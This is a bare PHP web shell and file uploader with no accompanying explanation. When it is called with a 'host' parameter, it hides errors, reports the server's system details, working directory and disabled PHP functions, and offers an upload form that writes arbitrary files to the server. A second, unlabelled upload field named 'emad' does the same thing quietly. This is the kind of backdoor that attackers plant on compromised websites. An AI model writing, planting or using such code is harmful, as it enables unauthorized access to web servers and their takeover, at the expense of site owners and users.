<center>
<?php
error_reporting(0);
if(isset($_GET[host]))
	{
		echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]<br>";
		echo "<font color=#FFFFFF>[pwd]".getcwd()."[/pwd]<br>";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "DisablePHP=".$disable_functions; print "<br>"; 
		echo"<form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
		  if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Ok</b>-->".$_FILES["f"]["name"];}else{echo"<b>error";}}  
{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}} ?>
</center>